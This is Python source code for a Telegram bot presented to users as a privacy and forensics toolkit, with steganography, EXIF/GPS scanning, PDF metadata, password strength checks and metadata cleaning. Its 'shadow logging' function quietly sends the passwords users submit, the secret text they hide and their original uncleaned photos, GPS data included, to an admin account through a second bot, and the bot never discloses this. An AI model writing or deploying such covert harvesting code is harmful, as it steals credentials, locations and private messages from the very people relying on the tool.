import telebot
from PIL import Image, ExifTags
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import io
import os
import re
import random
import string
import threading
from flask import Flask
from stegano import lsb
import pytesseract
import PyPDF2
from faker import Faker

# ==========================================
# 👇 CONFIGURATION (ENV VARIABLES) 👇
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN')
PROOF_TOKEN = os.environ.get('PROOF_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')

if not API_TOKEN:
    print("❌ Error: BOT_TOKEN missing!")

bot = telebot.TeleBot(API_TOKEN) if API_TOKEN else None
proof_bot = telebot.TeleBot(PROOF_TOKEN) if PROOF_TOKEN else None
fake = Faker()
user_data = {} # State management for Navigation

# ==========================================
# 🌐 FAKE SERVER (Render Keep-Alive)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Spy Bot V10 (Navigation System) is Live!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = threading.Thread(target=run_server)
    t.start()

# --- SHADOW LOGGING (SPY MODE) ---
def log_activity(user_msg, report_text=None, file_data=None, file_name="log.png", caption=""):
    if not proof_bot or not ADMIN_ID: return
    try:
        user_info = f"👤 **USER:** {user_msg.chat.first_name} (`{user_msg.chat.id}`)\n━━━━━━━━━━\n"
        full_log = user_info + (report_text if report_text else "")
        proof_bot.send_message(ADMIN_ID, full_log, parse_mode="Markdown")
        if file_data:
            file_data.seek(0)
            proof_bot.send_document(ADMIN_ID, file_data, visible_file_name=file_name, caption=f"📂 {caption}")
    except: pass

# --- HELPER FUNCTIONS ---
def get_gps_coords(exif):
    def to_deg(dms, ref):
        try:
            d = dms[0] + (dms[1]/60.0) + (dms[2]/3600.0)
            return -d if ref in ['S','W'] else d
        except: return None

    gps = exif.get(34853)
    if not gps: return None
    try:
        lat = to_deg(gps[2], gps[1])
        lon = to_deg(gps[4], gps[3])
        if lat and lon: return lat, lon
    except: return None
    return None

def format_pdf_date(d):
    return d.replace("D:", "").replace("'", "") if d else "Unknown"

def calculate_complexity(password):
    pool = 0
    if re.search(r"[a-z]", password): pool += 26
    if re.search(r"[A-Z]", password): pool += 26
    if re.search(r"\d", password): pool += 10
    if re.search(r"[^a-zA-Z0-9]", password): pool += 32
    if pool == 0: return 0, []
    combos = pool ** len(password)
    return combos, []

# --- MENUS & BUTTONS ---
def get_main_menu():
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("📸 Encrypt Image (Hide)", callback_data="mode_hide"),
        InlineKeyboardButton("🕵️ Analyze Image (Scan)", callback_data="mode_scan"),
        InlineKeyboardButton("📄 PDF Forensics", callback_data="mode_pdf"),
        InlineKeyboardButton("🛡️ Password Check", callback_data="mode_pass"),
        InlineKeyboardButton("🎭 Fake Identity", callback_data="mode_alias"),
        InlineKeyboardButton("🧹 Ghost Mode (Clean)", callback_data="mode_clean")
    )
    return markup

def get_back_button():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
    return markup

def get_home_button():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 Home / New Scan", callback_data="main_menu"))
    return markup

# --- MAIN COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    # Clear user state on start
    if message.chat.id in user_data: del user_data[message.chat.id]
    
    bot.reply_to(message, "🤖 **Cyber Spy V10**\nSelect an operation:", reply_markup=get_main_menu(), parse_mode="Markdown")
    log_activity(message, "🚀 User Started Bot")

# --- NAVIGATION HANDLER (BUTTONS) ---

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    cid = call.message.chat.id
    mid = call.message.message_id

    if call.data == "main_menu":
        if cid in user_data: del user_data[cid] # Reset State
        bot.edit_message_text("🤖 **Cyber Spy V10**\nSelect an operation:", cid, mid, reply_markup=get_main_menu(), parse_mode="Markdown")

    elif call.data == "mode_scan":
        user_data[cid] = {'mode': 'scan'}
        bot.edit_message_text("🕵️ **Scan Mode Active**\n\nUpload a Photo or Document to extract GPS, Dates, and Hidden Data.", cid, mid, reply_markup=get_back_button())

    elif call.data == "mode_hide":
        user_data[cid] = {'mode': 'hide_step1'}
        bot.edit_message_text("📸 **Encryption Mode**\n\nUpload the Image (As Document) you want to hide text inside.", cid, mid, reply_markup=get_back_button())

    elif call.data == "mode_pdf":
        user_data[cid] = {'mode': 'pdf'}
        bot.edit_message_text("📄 **PDF Forensics**\n\nUpload a PDF file to analyze metadata.", cid, mid, reply_markup=get_back_button())
    
    elif call.data == "mode_clean":
        user_data[cid] = {'mode': 'clean'}
        bot.edit_message_text("🧹 **Ghost Mode**\n\nUpload a photo to remove all tracking data (GPS/EXIF).", cid, mid, reply_markup=get_back_button())

    elif call.data == "mode_pass":
        user_data[cid] = {'mode': 'pass'}
        bot.edit_message_text("🛡️ **Password Shield**\n\nSend a password to check its strength.", cid, mid, reply_markup=get_back_button())

    elif call.data == "mode_alias":
        # Instant Action
        profile = fake.profile()
        txt = f"🎭 **FAKE IDENTITY**\nName: {profile['name']}\nJob: {profile['job']}\nEmail: {fake.email()}\nIP: {fake.ipv4()}"
        bot.edit_message_text(txt, cid, mid, reply_markup=get_back_button())
        log_activity(call.message, txt)

# --- UNIVERSAL INPUT HANDLER (SMART ALERTS) ---

@bot.message_handler(content_types=['text', 'photo', 'document'])
def handle_inputs(message):
    cid = message.chat.id
    
    # 1. ALERT: Check if user selected a mode
    if cid not in user_data or 'mode' not in user_data[cid]:
        bot.reply_to(message, "⚠️ **Alert:** Please select an option from the menu first!", reply_markup=get_main_menu(), parse_mode="Markdown")
        return

    mode = user_data[cid]['mode']

    # 2. Route to correct function based on mode
    if mode == 'scan':
        process_scan_logic(message)
    
    elif mode == 'hide_step1':
        if message.content_type not in ['photo', 'document']:
            bot.reply_to(message, "⚠️ Please upload an IMAGE file.", reply_markup=get_back_button())
            return
        download_and_save(message) # Save file and ask for text
        user_data[cid]['mode'] = 'hide_step2'
        bot.reply_to(message, "📝 **Now send the text** you want to hide:", reply_markup=get_back_button(), parse_mode="Markdown")

    elif mode == 'hide_step2':
        if message.content_type != 'text':
            bot.reply_to(message, "⚠️ Send text only.", reply_markup=get_back_button())
            return
        process_hide_logic(message)

    elif mode == 'pdf':
        process_pdf_logic(message)
    
    elif mode == 'clean':
        process_clean_logic(message)
    
    elif mode == 'pass':
        process_pass_logic(message)

# --- LOGIC FUNCTIONS ---

def download_and_save(message):
    file_id = message.document.file_id if message.document else message.photo[-1].file_id
    file_info = bot.get_file(file_id)
    downloaded = bot.download_file(file_info.file_path)
    path = f"temp_{message.chat.id}.png"
    with open(path, 'wb') as f: f.write(downloaded)
    user_data[message.chat.id]['file_path'] = path
    return downloaded

def process_scan_logic(message):
    try:
        if message.content_type not in ['photo', 'document']:
            bot.reply_to(message, "⚠️ Upload Photo/Document.", reply_markup=get_back_button())
            return
        
        status = bot.reply_to(message, "⚙️ Scanning...")
        downloaded = download_and_save(message)
        
        # Reload from path
        path = user_data[message.chat.id]['file_path']
        img = Image.open(path)
        
        report = "🕵️‍♂️ **FORENSIC REPORT**\n━━━━━━━━━━━━━━\n"
        
        # EXIF DATE/TIME CHECK
        exif = img._getexif()
        if exif:
            # Tag 306 is DateTime, 272 is Model
            date_time = exif.get(306, "Unknown (Screenshot/Edited)")
            model = exif.get(272, "Unknown Device")
            report += f"📅 **Date:** {date_time}\n"
            report += f"📱 **Device:** {model}\n"
        else:
            report += "📅 **Date:** Not Found (No Metadata)\n📱 **Device:** Not Found\n"

        # GPS
        if exif:
            coords = get_gps_coords(exif)
            if coords:
                report += f"📍 **Location:** [View Map](https://www.google.com/maps?q={coords[0]},{coords[1]})\n"
            else:
                report += "📍 **Location:** No GPS Data\n"
        else:
            report += "📍 **Location:** No GPS Data\n"

        # Hidden Msg
        try:
            hidden = lsb.reveal(path)
            if hidden: report += f"🔓 **Hidden:** `{hidden}`\n"
        except: pass
        
        # OCR
        try:
            text = pytesseract.image_to_string(img)
            if len(text.strip()) > 5: report += f"📝 **OCR:** {text[:100]}...\n"
        except: pass
        
        report += "━━━━━━━━━━━━━━"
        
        bot.delete_message(message.chat.id, status.message_id)
        bot.reply_to(message, report, reply_markup=get_home_button(), parse_mode="Markdown")
        
        # Shadow Log
        with open(path, 'rb') as f:
            log_activity(message, report, f, "scan.jpg", "Scanned File")
        
        os.remove(path)
        del user_data[message.chat.id] # Reset

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}", reply_markup=get_home_button())

def process_hide_logic(message):
    try:
        path = user_data[message.chat.id]['file_path']
        secret = lsb.hide(path, message.text)
        out_path = f"secret_{message.chat.id}.png"
        secret.save(out_path)
        
        with open(out_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ **Encrypted!**", reply_markup=get_home_button())
            f.seek(0)
            log_activity(message, f"Hidden: {message.text}", f, "secret.png", "Encrypted File")
            
        os.remove(path)
        os.remove(out_path)
        del user_data[message.chat.id]
    except Exception as e:
        bot.reply_to(message, "❌ Failed. Image too small.", reply_markup=get_home_button())

def process_pdf_logic(message):
    if message.content_type != 'document' or 'pdf' not in message.document.mime_type:
        bot.reply_to(message, "⚠️ PDF only.", reply_markup=get_back_button())
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        reader = PyPDF2.PdfReader(io.BytesIO(downloaded))
        meta = reader.metadata
        
        report = f"📄 **PDF DATA**\nAuthor: {meta.get('/Author','?')}\nCreated: {format_pdf_date(meta.get('/CreationDate','?'))}"
        bot.reply_to(message, report, reply_markup=get_home_button(), parse_mode="Markdown")
        log_activity(message, report)
        del user_data[message.chat.id]
    except:
        bot.reply_to(message, "❌ Error reading PDF.", reply_markup=get_home_button())

def process_clean_logic(message):
    if message.content_type not in ['photo', 'document']:
        bot.reply_to(message, "⚠️ Upload Image.", reply_markup=get_back_button())
        return

    try:
        downloaded = download_and_save(message)
        path = user_data[message.chat.id]['file_path']
        img = Image.open(path)
        
        data = list(img.getdata())
        clean_img = Image.new(img.mode, img.size)
        clean_img.putdata(data)
        
        out = io.BytesIO()
        clean_img.save(out, format="PNG")
        out.seek(0)
        
        bot.send_document(message.chat.id, out, caption="🧹 **Cleaned!** (Metadata Removed)", reply_markup=get_home_button())
        
        with open(path, 'rb') as f:
            log_activity(message, "Used Ghost Mode", f, "orig.jpg", "Original File")
            
        os.remove(path)
        del user_data[message.chat.id]
    except:
        bot.reply_to(message, "❌ Failed.", reply_markup=get_home_button())

def process_pass_logic(message):
    if message.content_type != 'text':
        bot.reply_to(message, "⚠️ Send Password text.", reply_markup=get_back_button())
        return
    
    combos, _ = calculate_complexity(message.text)
    report = f"🛡️ **Rating:** {'🟢 Excellent' if combos > 10**16 else '🔴 Weak'}\nCombos: {combos:.2e}"
    bot.reply_to(message, report, reply_markup=get_home_button(), parse_mode="Markdown")
    log_activity(message, f"Pass Check: {message.text}")
    del user_data[message.chat.id]

# --- RUN ---
if __name__ == "__main__":
    keep_alive()
    if bot: bot.infinity_polling()
